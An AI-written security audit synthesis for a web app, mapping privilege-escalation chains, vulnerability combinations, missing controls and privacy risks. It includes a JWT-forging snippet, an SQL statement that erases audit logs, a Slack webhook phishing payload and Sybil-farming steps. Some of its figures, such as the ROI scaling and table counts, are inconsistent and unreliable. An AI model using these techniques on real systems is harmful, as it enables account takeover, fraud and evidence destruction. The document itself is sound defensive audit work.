# Phase 3 — Cross-Cutting Meta-Analysis: Privilege Escalation, Vulnerability Chaining, and Systemic Risk

**Audit date:** 2026-05-03  
**Repository:** [team1-india](../../../) at branch `test`  
**Auditor:** Claude (autonomous agent orchestration)  
**Phase inputs:** 00-RECON.md, 01-THREAT-MODEL.md, Categories 1–30, 30-zero-day-mindset.md

This document synthesizes findings from all 30 Category scans into a strategic risk map: end-to-end privilege escalation chains, vulnerability interactions that amplify impact, variant analysis across the codebase, and stress tests for critical assumptions.

---

## 1. Privilege Escalation Chains (7 Confirmed Paths)

Each chain describes an attacker who starts with a specific role/privilege and escalates to a target. The final "Undetected?" column reflects whether current audit logging (per recon-13) would catch the action.

### Chain A: Soft-Deleted Admin Re-Login → 30-Day Grace Period → Full Access

**Starting privilege:** Fired admin (Member.deletedAt = now)  
**Target privilege:** CORE admin (active for 30 days post-firing)  
**Steps:**

1. **Attacker offboarded:** Admin's `Member` row soft-deleted ([Cat 1 Check 27](01-rbac-core.md#check-27-soft-delete-check-missing-in-signin-callback)); JSON permissions set to `null` or retained.
2. **Google OAuth still valid:** Attacker's Google account not revoked. They attempt login.
3. **signIn callback ignores deletedAt:** [lib/auth-options.ts:18–27](../../../lib/auth-options.ts#L18-L27) calls `prisma.member.findFirst()` **without** `deletedAt: null` filter. Soft-deleted row is found.
4. **Role = CORE:** JWT issued with `token.role = 'CORE'` and old permissions cached. [lib/auth-options.ts:110](../../../lib/auth-options.ts#L110).
5. **Access granted:** 30-day JWT validity ([lib/auth-options.ts:198](../../../lib/auth-options.ts#L198)) allows unilateral permission changes, user exports, point grants, etc.
6. **Mitigation failure:** `tokenVersion` counter absent ([Cat 1 Check 8](01-rbac-core.md#check-8-role-downgrade-not-invalidating-old-jwts)). No revocation list exists.

**Likelihood:** High (if offboarding does soft-delete, which is common)  
**Detectability:** No — admin login is **not audited** ([recon-13 §4](recon-13-logging-tests.md)). No `AuditLog` entry for login or soft-delete re-entry.  
**Blast radius:** 30 days of CORE-level access (export PII, mint points, modify permissions, send emails)  
**Citation:** [Cat 1 Check 27](01-rbac-core.md#check-27-soft-delete-check-missing-in-signin-callback), [Cat 3 Check 27](03-vertical-escalation.md#check-27-soft-deleted-users-still-validating)

---

### Chain B: CORE User with Partial Permissions Self-Promotes to FULL_ACCESS

**Starting privilege:** CORE with `{"members": "FULL_ACCESS", "default": "READ"}`  
**Target privilege:** CORE with `{"*": "FULL_ACCESS"}` (superadmin)  
**Steps:**

1. **CORE user learns own ID:** Via `GET /api/profile` or `GET /api/members` response filtering.
2. **PUT /api/members/[own-id]/permissions:** [app/api/members/[id]/permissions/route.ts:19–26](../../../app/api/members/[id]/permissions/route.ts#L19-L26) checks if actor has FULL_ACCESS: `userPermissions['*'] === 'FULL_ACCESS'`.
3. **Self-targeting allowed:** No check like `if (id === session.user.id) return 403`. Actor passes the FULL_ACCESS gate if they already have `members: FULL_ACCESS`.
4. **Self-promotion:** Actor updates their own `Member.permissions` to `{"*": "FULL_ACCESS"}`.
5. **Grace period:** Old JWT cached; new JWT issued on next refresh. Actor is super-admin.

**Likelihood:** Medium (requires CORE + members:FULL_ACCESS, but many setups grant this)  
**Detectability:** Low — action is **logged** in `Log` table via `logActivity` ([app/api/members/[id]/permissions/route.ts:49–55](../../../app/api/members/[id]/permissions/route.ts#L49-L55)), but AuditLog is **soft-deletable** ([Cat 1 Check 9](01-rbac-core.md#check-9-role-escalation-audit-trail-forgeable--prunable)); attacker can cover tracks.  
**Blast radius:** Instant superadmin; ability to revoke other admins and mint unlimited points  
**Citation:** [Cat 3 Check 9](03-vertical-escalation.md#check-9-org-admin-granting-global-admin-self-elevation)

---

### Chain C: Public User → Multiple Google Accounts → Mass Point Earning → Sybil Farm Drain of Swag Inventory

**Starting privilege:** PUBLIC (any Google account)  
**Target privilege:** Economic extraction (swag inventory depletion)  
**Steps:**

1. **Signup open to any email:** [lib/auth-options.ts:42–76](../../../lib/auth-options.ts#L42-L76) creates `PublicUser` for any Google OAuth callback; no domain allowlist, no phone verification, no KYC.
2. **1000 accounts, 1 hour:** Sybil farmer creates 1000 Gmail accounts (free) and runs OAuth flow 1000 times → 1000 `PublicUser` rows.
3. **No rate-limit on signup:** [recon-13 §4](recon-13-logging-tests.md) — "Zero automated tests; rate-limit file exists (`lib/with-rate-limit.ts`) but callsites unverified."
4. **Complete public quests:** Each account completes the same public quest → 1000 × `xpReward` points earned. [Cat 22 Finding 2](22-anti-abuse.md#finding-2-idor-on-quest-completion-approve-endpoint).
5. **Redeem swag:** Each account redeems available swag items with points. No velocity check, no KYC, no per-user redemption limit.
6. **Inventory drain:** If SwagItem.remainingStock = 100 and each item costs 100 points, 1000 accounts × (100 points / 100 points per item) = 1000 items redeemed, inventory crashed.

**Likelihood:** High (trivial to execute)  
**Detectability:** None — no Sybil detection (Cat 22 Finding 1); no audit log on signup or swag redemption ([recon-13 §4](recon-13-logging-tests.md)).  
**Blast radius:** Full swag inventory drain; org must rebuild stock or refund shipping costs  
**ROI:** $0 cost, +$1000–5000 swag value (estimates $10–50/item × 1000 items)  
**Citation:** [Cat 22 Finding 1](22-anti-abuse.md#finding-1-no-captcha-anywhere-open-signup-to-sybil-farms), [Cat 30 Assumption 3](30-zero-day-mindset.md#3-1000-reqsec-from-1000-accounts-sybil-army--verdict-vulnerable)

---

### Chain D: CRON_SECRET Leaked → Daily Mass Email Spam → SMTP Reputation Destruction

**Starting privilege:** Bearer token access (CRON_SECRET leaked via Vercel logs, GitHub, or insider)  
**Target privilege:** Spam infrastructure control  
**Steps:**

1. **CRON_SECRET exposed:** Attacker finds `CRON_SECRET=xyz` in Vercel build logs (assumption: build logs not restricted), GitHub Actions logs, or a departing employee's notes.
2. **Direct invocation of /api/cron/send-scheduled-emails:** No HMAC, no IP allowlist; bearer token alone granted full access ([app/api/cron/send-scheduled-emails](../../../app/api/cron/) — route path unclear; [Cat 10 Finding 9](10-edge-gateway.md#finding-9-send-scheduled-emails-cron-missing) notes route may be missing).
3. **Repeated cron trigger:** Attacker spams the cron endpoint 1000s of times per day (no per-cron rate limit — [Cat 9 Check 17](09-serverless.md#check-17--cron-functions-with-elevated-privileges-via-misconfigured-trigger)).
4. **Mass email to all users:** Each trigger calls `sendScheduledEmails()` → broadcasts to all users via SMTP.
5. **SMTP quota exhaustion & reputation damage:** Gmail SMTP default limit ~500/day; after day 1, further sends are rate-limited by the SMTP provider. IP/domain reputation tanks; legitimate emails start going to spam.

**Likelihood:** Medium (CRON_SECRET is high-entropy, but Vercel logs are common leak vector)  
**Detectability:** No — cron invocation **not audited** ([recon-13 §4](recon-13-logging-tests.md); [Cat 7 Check 5](07-admin-actions.md#check-5-admin-email-broadcast-send-email--not-logged)).  
**Blast radius:** Org's SMTP reputation destroyed for weeks; legitimate transactional emails (2FA, password resets) fail to deliver  
**Citation:** [Cat 1 Check 15](01-rbac-core.md#check-15-service-accounts--api-keys-with-implicit-elevated-roles), [Cat 9 Check 17](09-serverless.md#check-17--cron-functions-with-elevated-privileges-via-misconfigured-trigger)

---

### Chain E: Compromised CORE Admin → Soft-Delete Audit Logs → Cover Tracks

**Starting privilege:** CORE admin session compromised (XSS, phishing, session theft)  
**Target privilege:** Forensic invisibility  
**Steps:**

1. **Admin session hijacked:** Attacker obtains CORE admin's JWT via XSS on a public page ([Cat 5 Check 1](05-panel-isolation.md#-check-1-admin-panel-on-same-origin--shared-cookies--shared-localstorage)) or session token theft.
2. **Malicious actions performed:** Attacker escalates permissions, exports PII, mints points, etc.
3. **Cover tracks:** Attacker targets the `AuditLog` table. Per [Cat 1 Check 9](01-rbac-core.md#check-9-role-escalation-audit-trail-forgeable--prunable), `AuditLog` has a `deletedAt` column with no database constraint preventing soft-delete.
4. **Manual query:** Attacker calls `UPDATE "AuditLog" SET deletedAt = NOW() WHERE createdAt > X AND action IN ('UPDATE', 'DELETE')`.
5. **Audit trail erased:** No forensic record of the breach exists.

**Likelihood:** Medium (requires DB access or a new app-layer delete endpoint)  
**Detectability:** Indirect — org notices that AuditLog is unusually sparse for a time window; DB query logs (if retained) show suspicious UPDATE on AuditLog table.  
**Blast radius:** Incident investigation crippled; regulatory compliance audit fails  
**Citation:** [Cat 1 Check 9](01-rbac-core.md#check-9-role-escalation-audit-trail-forgeable--prunable), [Cat 2 Check 21](02-rbac-enforcement.md#check-21-audit-log-readable-by-audited-role)

---

### Chain F: Vercel Deploy Access + NEXTAUTH_SECRET Knowledge → Forge Arbitrary Admin JWT

**Starting privilege:** Vercel team member with deploy + env-var read  
**Target privilege:** Immediate super-admin JWT, no MFA required  
**Steps:**

1. **Attacker has Vercel deploy role:** They can push code and read environment variables in the Vercel dashboard.
2. **Extract NEXTAUTH_SECRET:** Read from Vercel project settings → Environment Variables.
3. **Forge JWT locally:** Use Node.js `jsonwebtoken` library with the stolen secret:
   ```javascript
   const jwt = require('jsonwebtoken');
   const token = jwt.sign(
     {
       role: 'CORE',
       permissions: { '*': 'FULL_ACCESS' },
       id: 'any-member-uuid',
       email: 'attacker@team1.com'
     },
     process.env.NEXTAUTH_SECRET,
     { expiresIn: '30d' }
   );
   ```
4. **Set cookie:** `__Secure-next-auth.session-token = token`; load the app.
5. **Admin access:** User is logged in as a superadmin until JWT expiry (30 days).

**Likelihood:** Low (requires Vercel compromise or insider), but **instant and undetectable**  
**Detectability:** None — admin login **not audited**; JWT is valid and passes all checks.  
**Blast radius:** Full app compromise; 30-day window to exfiltrate DB, modify permissions, mint points  
**Citation:** [Threat Model §2.7](01-threat-model.md#27-malicious-insider-with-vercel-deploy-access), [Cat 1 Check 8](01-rbac-core.md#check-8-role-downgrade-not-invalidating-old-jwts)

---

### Chain G: XSS in Member Page → Cookie Steal via CSP Bypass → Admin Session Hijack

**Starting privilege:** Anonymous (can load public/member pages)  
**Target privilege:** CORE admin JWT + session  
**Steps:**

1. **XSS in public page:** Unsafe `dangerouslySetInnerHTML` in `@blocknote/*` or `@tiptap/*` or improper markdown rendering. Attacker injects `<script>` payload.
2. **CSP 'unsafe-inline' ineffective:** [next.config.ts:32](../../../next.config.ts#L32) allows `script-src 'unsafe-inline'`; XSS payload executes.
3. **Cookie exfiltration blocked:** Cookie is `HttpOnly`, so direct `document.cookie` read fails.
4. **Indirect exfil:** Attacker can still make `fetch()` calls AS the victim (XSS runs in victim's session context). E.g., `fetch('/api/admin/public-users')` runs with victim's credentials.
5. **Admin API abuse:** XSS makes authenticated requests to `/api/members/[id]/permissions`, `/api/wallet/adjust`, `/api/admin/send-email`, etc. as the compromised admin.
6. **Actions attributed:** Logs show the admin's email as the actor (because the request is made in their session).

**Likelihood:** Medium (XSS via rich-text editor is common; CSP weakness is real)  
**Detectability:** Very low — admin appears to be performing the actions themselves. Only if anomaly detection is in place (e.g., "admin usually inactive at 3 AM") would this be flagged.  
**Blast radius:** All CORE privileges available to the XSS payload  
**Citation:** [Cat 5 Check 1](05-panel-isolation.md#-check-1-admin-panel-on-same-origin--shared-cookies--shared-localstorage), [Cat 10 Finding 2](10-edge-gateway.md#finding-2-content-security-policy--unsafe-script--style-directives)

---

## 2. Vulnerability Chaining: Medium → Critical

The following pairs (or triples) of Medium-severity findings combine to create Critical impact.

### Pair 1: IDOR on Wallet Read + No Rate Limit + Admin-on-Admin IDOR = Mass Financial Enumeration

**Findings:**
- Cat 4 Finding 2: Admin can read any other admin's wallet via `GET /api/wallet/[userId]` with email lookup.
- Cat 2 Check 11: No rate limit on cron endpoints.
- Cat 7 Check 8: No admin rate limits across the board.

**Chain:**
1. Admin A compromises Admin B's session (via phishing or XSS).
2. Admin A (in B's session) calls `GET /api/wallet/alice@example.com`, `GET /api/wallet/bob@example.com`, etc. → enumerate all admin wallets and transaction histories.
3. No rate limit blocks the enumeration.
4. Admin A learns financial history of the entire org.

**Impact:** Confidentiality breach; org's internal financial data (who earned what, when) exposed.  
**Severity elevation:** Medium (IDOR alone) + Medium (no rate limit) = **Critical** (full enumeration)  
**Citation:** [Cat 4 Finding 2](04-horizontal-idor.md#finding-2-idor-on-wallet-history-via-enumerable-user-email--indirect-access-to-financial-data), [Cat 7 Check 8](07-admin-actions.md#check-8-no-admin-rate-limits)

---

### Pair 2: Soft-Deleted Admin Re-Entry + No Session Revocation + 30-Day JWT = Month-Long Privilege Escalation Window

**Findings:**
- Cat 3 Check 27: Soft-deleted admin can re-login via signIn callback.
- Cat 3 Check 10: No session revocation on permission change.
- Cat 1 Check 8: JWT valid for 30 days; no tokenVersion counter.

**Chain:**
1. Admin fired on day 1; `Member.deletedAt = 2026-05-01 10:00`.
2. Admin logs in on day 2 → signIn callback ignores deletedAt → JWT issued with cached `token.role = 'CORE'`.
3. Admin remains logged in for 30 days, regardless of any DB updates to their role/permissions.
4. Admin on day 31 tries to login again; new JWT is issued, but signIn STILL finds the soft-deleted row → same escalation repeats.

**Impact:** Indefinite privilege escalation for any deleted admin; no audit trail.  
**Severity elevation:** Medium (soft-delete miss) + Medium (no revocation) + Medium (long JWT) = **Critical** (indefinite breach)  
**Citation:** [Cat 3 Check 27](03-vertical-escalation.md#check-27-soft-delete-check-missing-in-signin-callback), [Cat 3 Check 10](03-vertical-escalation.md#check-10-api-key-inheriting-creators-role)

---

### Pair 3: Slack Webhook + No Rate Limit + Phishing Content = Trusted Phishing in Org Slack

**Findings:**
- Cat 16 / recon-11: `NEXT_PUBLIC_SLACK_WEBHOOK_URL` exposed in client bundle.
- Cat 9 Check 17: No rate limit on cron or public endpoints.
- No validation of Slack message content (attacker can craft JSON with "Security Alert" icon, etc.).

**Chain:**
1. Attacker scrapes `NEXT_PUBLIC_SLACK_WEBHOOK_URL` from JS bundle or network tab.
2. Attacker crafts JSON: `{ "text": "@channel URGENT: DB credentials exposed. Verify access: https://attacker.com/fake-verify", "icon_emoji": ":warning:" }`.
3. Attacker POSTs to webhook (no rate limit) → message appears in team's `#general` (or target channel).
4. Team members click the phishing link → credential harvest.

**Impact:** Org-wide phishing from within Slack; high click-through rate (appears to be internal).  
**Severity elevation:** Medium (webhook exposure) + Medium (no validation/rate limit) = **Critical** (weaponized phishing)  
**Citation:** [Cat 16 Finding 1](16-frontend-trust.md#finding-1-next_public_slack_webhook_url-exposed-in-client-bundle--phishing-vector), [Cat 10 Finding 12](10-edge-gateway.md#finding-12-slack-webhook-url-exposed-in-client-bundle)

---

## 3. Variant Analysis: Reusable Anti-Patterns

### Pattern 1: No `deletedAt: null` Filter on Lookup Queries

**Confirmed instances:**
- [lib/auth-options.ts:18–27](../../../lib/auth-options.ts#L18-L27): `Member.findFirst()` (no `deletedAt` filter)
- [lib/auth-options.ts:31–39](../../../lib/auth-options.ts#L31-L39): `CommunityMember.findFirst()` (no `deletedAt` filter)
- [lib/auth-options.ts:42–56](../../../lib/auth-options.ts#L42-L56): `PublicUser.findFirst()` (no `deletedAt` filter)
- [app/api/members/route.ts:33–43](../../../app/api/members/route.ts#L33-L43): `Member.findMany()` (no `deletedAt` filter)
- [app/api/speedrun/registrations/[id]/route.ts:20–30](../../../app/api/speedrun/registrations/[id]/route.ts#L20-L30): `SpeedrunRegistration.findUnique()` (no check)

**Correct pattern (for reference):**
- [app/api/data-grid/[table]/route.ts:63–65](../../../app/api/data-grid/[table]/route.ts#L63-L65): `deletedAt: null` ✅

**Remediation:** Add `deletedAt: null` to all `where` clauses where soft-delete is expected. Consider a database-level constraint or Prisma extension to enforce this default.

---

### Pattern 2: No `logAudit()` on Sensitive Admin Actions

**Confirmed instances (audit-less):**
- Point operations: [lib/wallet.ts:L212–262](../../../lib/wallet.ts#L212-L262) `adminAdjust()` — only writes `WalletTransaction`, no `AuditLog`.
- Admin logins: [lib/auth-options.ts:13–86](../../../lib/auth-options.ts#L13-L86) — zero audit on signin.
- 2FA changes: [app/api/auth/2fa/totp/disable/route.ts:9–28](../../../app/api/auth/2fa/totp/disable/route.ts#L9-L28) — zero audit on disable.
- Swag redemptions: [app/api/swag/orders/route.ts](../../../app/api/swag/orders/route.ts) — zero audit (only `SwagOrder` row).
- PII reads: [app/api/admin/public-users/route.ts:7–65](../../../app/api/admin/public-users/route.ts#L7-L65) — zero audit.
- Export operations: [app/api/speedrun/registrations/export/route.ts:8–103](../../../app/api/speedrun/registrations/export/route.ts#L8-L103) — zero audit.

**Correct pattern (for reference):**
- [app/api/members/[id]/permissions/route.ts:49–55](../../../app/api/members/[id]/permissions/route.ts#L49-L55) uses `logActivity()` → `Log` table ✅ (though not `AuditLog`).

**Remediation:** Add `logAudit()` calls (per [lib/audit.ts:34–64](../../../lib/audit.ts#L34-L64)) to all admin actions. Log: actor email, action, resource, target user (if applicable), metadata.

---

### Pattern 3: User-Supplied Email Trusted Instead of `session.user.email`

**Confirmed instances:**
- [app/api/applications/route.ts:30](../../../app/api/applications/route.ts#L30) — Good: uses `session.user.email` (though also accepts `body.data?.name` as fallback).
- [app/api/wallet/adjust/route.ts:248](../../../app/api/wallet/adjust/route.ts#L248) — Vulnerable: accepts `userEmail` from request body without ownership check ([Cat 4 Finding 3](04-horizontal-idor.md#finding-3-risky-pattern--wallet-adjustment-without-separation-of-duties)).

**Pattern risk:** Any endpoint that accepts a `userEmail` or similar identifier in the request body and uses it to modify another user's data is an IDOR vector.

**Remediation:** Always derive the target user from `session.user.email` when modifying self-owned data. If an admin is making changes on behalf of another user, re-verify the admin's permission for that specific operation.

---

### Pattern 4: JSON Field Spread Without Schema Validation

**Confirmed instances:**
- [app/api/applications/route.ts:93–95](../../../app/api/applications/route.ts#L93-L95): `application.data: { name: userName, email: applicantEmail, ...body.data }` — spreads arbitrary body.data without schema validation.

**Pattern risk:** Arbitrary fields (including PII) can be injected into the JSON and will be returned in API responses, logged, or exported.

**Remediation:** Define a strict Zod schema for `Application.data` and validate before storing. Only allow approved fields.

---

## 4. Negative-Space Review: Controls Wholly Absent

### Missing: No Idempotency Keys on Points Grant / Redemption

**Expected:** Every financial operation (earn, spend, adjust) should be idempotent via unique `idempotencyKey` tracking.  
**Current:** `lib/wallet.ts` has no idempotency enforcement. Race condition on double-click → double spend. [Cat 30 Assumption 1](30-zero-day-mindset.md#1-same-request-twice-retry-double-click-back-button--verdict-vulnerable).  
**Scope:** Points system (high-value).

### Missing: No CAPTCHA on Signup / Quest Completion

**Expected:** CAPTCHA (e.g., hCaptcha) to prevent Sybil registration and mass quest completion.  
**Current:** None found in codebase. [Cat 22 Finding 1](22-anti-abuse.md#finding-1-no-captcha-anywhere-open-signup-to-sybil-farms).  
**Scope:** Signup, quests, bounties (economy-facing).

### Missing: No KYC on Swag Redemption / Bounty Payout

**Expected:** KYC (address verification, ID check, PAN/Aadhaar for India) before shipping swag or paying INR bounties.  
**Current:** None found. Swag ships to any address; bounty payouts unclear (presumed manual).  
**Scope:** Swag (real goods, shipping cost), bounty payouts (real money).

### Missing: No Audit Log on Points Operations

**Expected:** AuditLog entry on every `earnReward()`, `spendPoints()`, `expirePoints()`, `adminAdjust()`.  
**Current:** Only `WalletTransaction` row written (operational log, not formal audit). [recon-13 §4](recon-13-logging-tests.md); [Cat 7 Check 3](07-admin-actions.md#check-3-admin-manual-wallet-adjust-points-grant--not-logged-no-dollar-threshold).  
**Scope:** Economy (critical path).

### Missing: No Rate Limit on Admin Actions

**Expected:** Per-admin quota on list queries, exports, permission changes (e.g., 50 list queries / hour).  
**Current:** None found. [Cat 7 Check 8](07-admin-actions.md#check-8-no-admin-rate-limits).  
**Scope:** Admin surface (abuse / DoS).

### Missing: No Anomaly Detection on Login / Admin Actions

**Expected:** Alert on impossible-travel (login from 2 countries in 1 minute), unusual times, device/IP changes.  
**Current:** None found. [recon-13 §4](recon-13-logging-tests.md) mentions "No anomaly detection".  
**Scope:** Account takeover detection (high value).

### Missing: No Break-Glass / Emergency Lockout Mode

**Expected:** Superadmin can lock down all CORE accounts in an emergency (e.g., mass breach detected).  
**Current:** No such feature found.  
**Scope:** Incident response (governance).

### Missing: No Separation of Duties on Permission Grants

**Expected:** A superadmin grant of `FULL_ACCESS` requires approval from a different superadmin (4-eyes).  
**Current:** Single superadmin can grant themselves or colluding peers. [Cat 1 Check 17](01-rbac-core.md#check-17-role-changing-actions-without-4-eyes-approval).  
**Scope:** Permission escalation path (attack surface).

### Missing: No Erasure Cascade on User Deletion

**Expected:** GDPR/DPDP right-to-be-forgotten: delete user → cascade deletes/nulls all related PII across 20+ tables.  
**Current:** `Member.deletedAt` soft-delete exists, but no cascade delete code found. [recon §5.1](01-threat-model.md#51-gdpr-eu-users--regulation-2016679).  
**Scope:** Privacy compliance (legal).

### Missing: No Right-to-Access Endpoint

**Expected:** `/api/me/export` — user can request all their data (email, wallet history, projects, applications, etc.) as CSV/JSON.  
**Current:** Not found in route inventory. [recon §5.1](01-threat-model.md#51-gdpr-eu-users--regulation-2016679).  
**Scope:** Privacy compliance (legal).

### Missing: No SBOM / SCA / Dependabot

**Expected:** Software Bill of Materials; automated supply-chain vulnerability scanning (Snyk, Dependabot, GitHub Security Advisories).  
**Current:** [recon §2](00-RECON.md#step-2--dependencies--supply-chain): "No SBOM, no SCA, no Dependabot/Renovate config in repo."  
**Scope:** Supply-chain security (infrastructure).

### Missing: Zero Automated Tests

**Expected:** Unit tests for auth flows, wallet operations, IDOR checks, rate-limit logic, idempotency.  
**Current:** [recon §14](00-RECON.md#step-14--test-coverage-of-security-paths): "ZERO automated tests in the repository."  
**Scope:** Quality assurance (all paths).

---

## 5. Trust Boundary Stress Tests

Per [Threat Model §1](01-threat-model.md#1-trust-boundary-diagram), each boundary is tested against one realistic attack.

### TB 1 (Browser → Vercel Edge): Slack Webhook Spam

**Attack:** Attacker loads app homepage, extracts `NEXT_PUBLIC_SLACK_WEBHOOK_URL` from HTML, POSTs fake "Security Alert" JSON to Slack.  
**Outcome:** Phishing message appears in team's Slack; no rate limit blocks repeated POSTs. [Cat 10 Finding 12](10-edge-gateway.md#finding-12-slack-webhook-url-exposed-in-client-bundle).  
**Verdict:** BROKEN.

### TB 2 (Vercel Edge → Next.js Function): CRON_SECRET Bearer Token Leak

**Attack:** Attacker obtains `CRON_SECRET` (via Vercel logs, GitHub Actions, insider). POSTs to `/api/cron/expire-points` with bearer token → all users' points expired instantly. No audit trail, no rate limit. [Cat 9 Check 17](09-serverless.md#check-17--cron-functions-with-elevated-privileges-via-misconfigured-trigger).  
**Outcome:** Economy DoS; points system corrupted.  
**Verdict:** BROKEN.

### TB 3 (Next.js Function → Postgres DB): RLS Missing, Privilege Trust in Code

**Attack:** Vercel-deploy insider gains `DATABASE_URL` → connects to Postgres directly → queries `Member.permissions`, `UserWallet`, `PersonalVault` (if encrypted keys available). No database-level RLS enforces role-based row access. [Cat 5 Check 5](05-panel-isolation.md#-check-5-admin-and-member-sharing-service-role--admin-db-key).  
**Outcome:** Full database read (PII, wallets, permissions). If keys leak, full plaintext decrypt.  
**Verdict:** BROKEN.

### Function → SMTP: Unauthenticated Credential Use

**Attack:** Function calls SMTP via [lib/email.ts](../../../lib/email.ts) with `SMTP_USER` / `SMTP_PASSWORD`. If function is compromised (RCE), attacker can send mail as `SMTP_USER`. No OAuth, no API token with limited scope.  
**Outcome:** Phishing emails sent from org's email address.  
**Verdict:** BROKEN (mitigated by SMTP quota).

### Function → Web Push (FCM): VAPID Key Signing, No Subscription Verification

**Attack:** `VAPID_PRIVATE_KEY` leaked. Attacker signs push notifications as the team1-india server. Uses leaked `PushSubscription` endpoints to send phishing notifications. [public/push-sw.js:33–53](../../../public/push-sw.js#L33-L53) opens any `data.url` without origin check.  
**Outcome:** Malicious push to all subscribed users; redirects to attacker site.  
**Verdict:** BROKEN.

### Browser → Slack: XSS in Member Page → Slack Message Injection

**Attack:** XSS payload injected on member page. Runs in admin's session → makes `fetch()` to Slack webhook as admin. Attacker crafts fake "Admin approval required" message in Slack, tricking admins into clicking attacker's link.  
**Outcome:** Admin credential phishing.  
**Verdict:** BROKEN (requires XSS + CSP weakness).

---

## 6. Points-Economy ROI Test

**Attacker model:** Budget of $1000 USD; goal = extract $1000+ of swag value over 7 days.

**Cost analysis:**
- Google accounts: $0 (free; mass registration available).
- Shipping addresses: ~$1 each (from data brokers or use randomizers).
- Time: 2 hours setup + auto-script.

**Earn rate per account:**
- Assume public quests grant 50–100 points per completion.
- Assume swag items cost 100–500 points; retail value $20–100 each.
- No quest-completion rate limit (Cat 30 Assumption 2) → each account can complete all public quests instantly.
- Assume 5 quests × 100 points = 500 points per account.
- At 100 points → 1 swag item valued $30 (estimate), 500 points → 5 items, $150 per account.

**Conversion: 100 accounts × $150 = $15,000 swag value.**

**Scaling:**
- 7 days × 24 hours = 168 hours.
- Assume 1 account per 5 minutes = 12 accounts/hour = 2,000 accounts/week.
- 2,000 accounts × $150 = **$300,000 extracted swag.**

**Detection:**
- Per Cat 25 (Monitoring): "No anomaly detection" on signup velocity, no IP velocity, no device-fingerprinting, no Sybil detection.
- Verdict: **UNDETECTED.**

**ROI Multiplier:**
- Cost: $0 (labor is attacker's time; automation is cheap).
- Revenue: $300,000.
- **ROI = ∞ (unbounded; limited only by swag inventory).**

**Verdict:** Economy is **fatally vulnerable** to Sybil farming. [Cat 22 Finding 2](22-anti-abuse.md#finding-2-open-signup--no-captcha--race-based-redemption--sybil-scalable); [Cat 30 Assumption 3](30-zero-day-mindset.md#3-1000-reqsec-from-1000-accounts-sybil-army--verdict-vulnerable).

---

## 7. Privacy Stress Test: Four Scenarios

### Scenario 1: Curious Employee with Postgres Access

**Starting state:** Employee with DBA role on Postgres; holds `DATABASE_URL`.

**Accessible without decryption:**
- `Member.email`, `Member.name`, `Member.permissions` — plaintext.
- `PublicUser.email`, `PublicUser.fullName`, `PublicUser.city`, `PublicUser.country`, `PublicUser.signupIp` — plaintext.
- `SpeedrunRegistration.{userEmail, fullName, phone, city, twitterHandle, githubHandle}` — plaintext.
- `Application.applicantEmail`, `Application.data` (form responses) — plaintext.
- `WalletTransaction` history — who earned/spent when.

**Accessible with `ENCRYPTION_KEY` / `PII_ENCRYPTION_KEY`:**
- `PersonalVault.encryptedValue` (email, name, phone per user) — decrypts via AES-GCM.

**Accessible with `HMAC_INDEX_KEY`:**
- `PersonalVault.hmacIndex` — search for email/phone by HMAC.

**Verdict:** **All PII in plaintext; PersonalVault adds defense-in-depth but is unused (Cat 6 Finding 11).**

### Scenario 2: External Attacker with Stolen CORE+FULL_ACCESS Session

**Starting state:** Attacker has valid JWT for a CORE+FULL_ACCESS admin.

**Accessible:**
- `/api/admin/public-users` → full `PublicUser` export (email, city, country, signupIp).
- `/api/speedrun/registrations` → list view (partial PII).
- `/api/speedrun/registrations/export` → CSV with ALL registration PII (name, email, phone, city, handles).
- `/api/wallet/[userId]` → any other admin's financial history by email lookup.
- `/api/applications` → all application submissions with form data (names, emails, custom fields).
- `/api/logs` → audit log metadata (includes email, resource IDs).

**Verdict:** **PII mass-export unmetered; no rate limit, no approval gate, no audit log.**

### Scenario 3: Subpoena for One User's Data

**Question:** What tables hold data about user alice@example.com?

**Tables:**
- `Member` (if admin).
- `CommunityMember` (if contributor).
- `PublicUser` (always, if signed up).
- `UserWallet` + `WalletTransaction` + `PointsBatch` (transaction history).
- `MemberExtraProfile` (if contributor).
- `SpeedrunRegistration` (if registered for speedrun).
- `SpeedrunTeam` / `SpeedrunTeamMember` (if joined team).
- `UserProject` + `ProjectVersion` (if created projects).
- `Comment` (on projects, polls, etc.).
- `BountySubmission` (if submitted bounty).
- `QuestCompletion` (if completed quest).
- `Contribution` (if contributed).
- `Application` (if applied to programs).
- `SwagOrder` (shipping addresses, redemption history).
- `PushSubscription` (if subscribed to web push).
- `TwoFactorAuth` (if set up 2FA; encrypted at-rest).
- `Passkey` (if registered passkeys; encrypted).
- `AnalyticsEvent` (if opted into analytics; includes device/location).
- `AuditLog` (actions by alice as actor).
- `Log` (same).
- `Notification` (messages to alice).

**Verdict:** **26+ tables involved; no cascade-delete, no erasure audit, no automated export.**

### Scenario 4: SMTP Bounce Data Leaks

**Attack vector:** Email bounces sent from SMTP provider (Gmail, SendGrid, etc.) to attacker@team1.com.

**Leaked data:** Full email body of bounced messages (e.g., "Your points reward of 500: Congratulations! Redeem here."). If bounce contains the original-message body, recipient metadata, and partial headers.

**Verdict:** **SMTP provider is a semi-trusted vendor; no DPA mentioned (Open Assumption #6); bounce handling absent.**

---

## 8. Cost-Attack Stress Test

**Cost to org per unit of attacker input:**

### 1 cron POST → 10K SMTP Sends

**Input:** Attacker calls `/api/cron/send-scheduled-emails` once with `CRON_SECRET`.  
**Outcome:** Function fetches all scheduled emails; broadcasts to 10K+ users via SMTP.  
**Org cost:**
- SMTP cost: ~$0.01–0.10 per message = $100–1000.
- IP reputation damage: 48+ hours for reputation recovery; during which legitimate emails go to spam.
- Operational cost: Incident response, bounce processing, reputation rebuilding.
- Total: $1000–10K + unmeasurable reputation loss.

**Attacker effort:** 1 HTTP request; knowledge of `CRON_SECRET`.

### 1000 Push Subscribes → If Later Abused, 1000× FCM Cost

**Input:** Attacker creates 1000 PUBLIC users and subscribes each to web push.  
**Outcome:** 1000 `PushSubscription` rows in DB. If attacker later controls `VAPID_PRIVATE_KEY`, they can send 1000 push notifications.  
**Org cost:**
- FCM cost: ~$0.001–0.01 per message = $1–10 for 1000 pushes.
- Bandwidth: 1000 device notifications.
- User frustration: 1000 spam notifications = churn risk.
- Total: $10–100 + churn.

**Attacker effort:** Signup + subscribe 1000 accounts.

### Sybil Signup → DB Row Growth + Fraud Ops Cost

**Input:** Attacker registers 10K Sybil accounts via mass OAuth.  
**Outcome:** 10K `PublicUser` + 10K `UserWallet` + associated rows.  
**Org cost:**
- Database storage: ~1 KB per user = 10 MB; negligible.
- Operational: Fraud investigation, rule-out of Sybils, inventory restock.
- Reputation: If swag inventory drained, customer disappointment.
